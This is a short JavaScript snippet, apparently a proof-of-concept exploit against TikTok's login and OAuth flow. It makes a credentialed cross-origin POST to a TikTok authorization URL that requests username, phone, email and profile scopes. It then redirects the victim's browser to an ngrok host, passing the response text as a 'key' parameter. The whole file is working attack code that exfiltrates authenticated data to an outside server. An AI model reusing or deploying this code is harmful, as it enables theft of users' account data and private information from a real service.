var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("POST", "https://www.tiktok.com/login?lang=en&enter_method=web&enter_from=dev_awn32gkr1d27lv49&redirect_url=https%253A%252F%252Fwww.tiktok.com%252Fv2%252Fauth%252Fauthorize%252F%253Fclient_key%253Dawn32gkr1d27lv49%2526redirect_uri%253Dhttps%25253A%25252F%25252Fseller-id.tiktok.com%25252Faccount%25252Foauth%25252Ftt%25252Fcallback%2526scope%253Duser.info.username%25252Cuser.info.basic%25252Cuser.info.phone%25252Cuser.info.email%25252Cuser.info.profile%25252Cuser.info.stats%2526response_type%253Dcode%2526state%253D%25257B%252522csrfState%252522%25253A%252522e2r5l%252522%25252C%252522login_only%252522%25253A1%25252C%252522page_name%252522%25253A%252522log_in%252522%25252C%252522redirect_url%252522%25253A%252522https%25253A%25252F%25252Fseller-id.tiktok.com%25252Fhomepage%25253Fregion_check%25253D1%252522%25252C%252522url_params%252522%25253A%252522%252522%25257D%2526lang%253Den&hide_left_icon=0&type=");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send();

function reqListener() {
    location='//b564-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
};
